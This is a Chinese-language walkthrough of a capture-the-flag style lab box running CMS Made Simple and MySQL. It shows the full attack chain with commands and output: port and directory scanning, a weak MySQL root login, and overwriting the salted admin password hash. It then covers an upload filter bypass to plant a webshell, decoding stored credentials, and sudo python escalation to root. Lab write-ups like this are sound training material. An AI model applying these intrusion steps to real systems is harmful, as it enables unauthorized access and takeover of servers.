```
nmap -sP 192.168.0.0/24
```

```
└─# nmap -p- -sV -A 192.168.0.103
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Home - My CMS
3306/tcp  open  mysql   MySQL 8.0.19
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.19
|   Thread ID: 41
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSigpipes, InteractiveClient, Support41Auth, FoundRows, SupportsTransactions, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolOld, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, LongPassword, LongColumnFlag, ODBCClient, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x1A\x01\x01#bg\x7F:8\x0DA\x14HJmVex\x0D6
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate
| Not valid before: 2020-03-25T09:30:14
|_Not valid after:  2030-03-23T09:30:14
|_ssl-date: TLS randomness does not represent time
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000

```

### 对于80端口：

对80端口基本探测

```
└─# nikto -host 192.168.0.103    
```

```
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie CMSSESSID2a2f83428536 created without the httponly flag
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-5034: /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify.
+ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
+ OSVDB-3092: /lib/: This might be interesting...
+ OSVDB-3268: /tmp/: Directory indexing found.
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/login.php: Admin login page/section found
```

目录探测

```
└─# gobuster dir -u http://192.168.0.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak
```

```
/.html.bak            (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 19422]
/modules              (Status: 301) [Size: 316] [--> http://192.168.0.103/modules/]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.0.103/uploads/]
/doc                  (Status: 301) [Size: 312] [--> http://192.168.0.103/doc/]
/admin                (Status: 301) [Size: 314] [--> http://192.168.0.103/admin/]
/assets               (Status: 301) [Size: 315] [--> http://192.168.0.103/assets/]
/lib                  (Status: 301) [Size: 312] [--> http://192.168.0.103/lib/]
/config.php           (Status: 200) [Size: 0]
/tmp                  (Status: 301) [Size: 312] [--> http://192.168.0.103/tmp/]
/phpmyadmin           (Status: 401) [Size: 460]
/.html.bak            (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/phpinfo.php          (Status: 200) [Size: 90117]
/server-status        (Status: 403) [Size: 278]
```

#### 思路：

cms的CMS Made Simple源码漏洞，phpinfo.php泄露，phpmyadmin的爆破（使用认证Authorization: Basic YWE6YWE=）， http://192.168.0.103/admin/login.php登录框的sql注入和爆破

注意到版本[CMS Made Simple](http://www.cmsmadesimple.org/) version 2.2.13

```
└─# searchsploit cms made simple
```

好像思路堵住了

### 3306端口：

由于nmap可以返回详细信息，所以次mysql是允许远程连接的

试试爆破mysql的root密码

这里我用hydra和msf爆破，网站直接ping不通了

```
└─# mysql -h 192.168.0.103 -uroot -p
root
```

弱口令登录成功，现在来到mysql提权

#### MySQL提权：

<img src=".\图片\Snipaste_2022-11-23_21-15-21.png" alt="Snipaste_2022-11-23_21-15-21" style="zoom:80%;" />

之前看到phpinfo.php里应该有网站路径  /var/www/html

<img src=".\图片\Snipaste_2022-11-23_21-17-47.png" alt="Snipaste_2022-11-23_21-17-47" style="zoom:80%;" />

mysql写shell失败，这个OFF好像无法用MySQL的root权限修改，好像udf提权好像也不靠谱，因为目前只能进入mysql而已，无法修改相关文件达成其条件

<img src=".\图片\Snipaste_2022-11-23_21-28-15.png" alt="Snipaste_2022-11-23_21-28-15" style="zoom:80%;" />

看到cms_users表，看到好像后台密码是MD5加密的

<img src=".\图片\Snipaste_2022-11-23_21-40-25.png" alt="Snipaste_2022-11-23_21-40-25"  />

试试解密失败，试试重写覆盖密码MD5值也失败，应该是后端有自己的加密算法

思路暂停

### 翻出源码：

找出其加密密码的方式，再生成合规密码，在写入覆盖便可进后台了。

发现是固定值“a235561351813137”拼接原密码再MD5加密

```
└─# echo -n a235561351813137zf1yolo | md5sum                                                               
4169c743c0623e1a1a7b06bdfaa14442  -
```

成功进入后台管理页面

<img src=".\图片\Snipaste_2022-11-23_21-53-27.png" alt="Snipaste_2022-11-23_21-53-27" style="zoom:80%;" />

这里有经典的文件上传功能

可以上传php反弹shell的后门，也可以试试一句话

这里有文件上传限制，试试突破，后缀名改为phtml

上哥斯拉，这里时www权限

### 提权到ROOT：

所有用户都能用root权限执行该命令输出的内容

```
find / ‐perm ‐u=s ‐type f 2>/dev/null
```

然而好像这里作用不大，再试试从文件里找到敏感信息

```
cd /var/www/html/admin
cat .htpasswd
TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
```

TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=这玩儿一眼base64,试试解码，一次base64一次base32

```
echo 'TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0='  |  base64 -d
MFZG233VOI5FG2DJMVWGIQBRGIZQ====
echo 'MFZG233VOI5FG2DJMVWGIQBRGIZQ===='  |  base32 -d
armour:Shield@123
```

得到账号armour的密码，试试ssh连接

老办法哥斯拉转到msf再得到用python交互式shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

再su

```
www-data@mycmsms:/var/www/html/uploads/images$ su armour
su armour
Password: Shield@123
armour@mycmsms:/var/www/html/uploads/images$ whoami
whoami
armour
```

使用sudo -l，看看armour可以使用哪些以root身份进行的命令，如果这个命令可以调用bash之类的，就可以直接切到root身份，此时发现有python

```
armour@mycmsms:/var/www/html/uploads/images$ sudo -l
sudo -l
Matching Defaults entries for armour on mycmsms:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User armour may run the following commands on mycmsms:
    (root) NOPASSWD: /usr/bin/python
```

```
sudo python -c 'import pty; pty.spawn("/bin/bash")'
```

```
armour@mycmsms:/var/www/html/uploads/images$ sudo python -c 'import pty; pty.spawn("/bin/bash")'
<sudo python -c 'import pty; pty.spawn("/bin/bash")'
root@mycmsms:/var/www/html/uploads/images# whoami
whoami
root
```

大功告成

<img src=".\图片\Snipaste_2022-11-23_22-58-22.png" alt="Snipaste_2022-11-23_22-58-22" style="zoom:80%;" />

### 总结：

不要在80端口一条路磕到死，看看其它端口的肯能性，要善于从网上找到目标网站的相关信息，比如源码啥的，mysql写shell失败时有多种原因，可以看看数据库里的网站后台账号密码啥的。

文件上传突破方法。。。

代码审计一步步跟，找到password的加密方式

www提权时善于翻阅目标服务器敏感信息，要得到交互shell可以转到msf里再调用python交互shell

sudo提权，看看普通用户能以root身份执行啥东西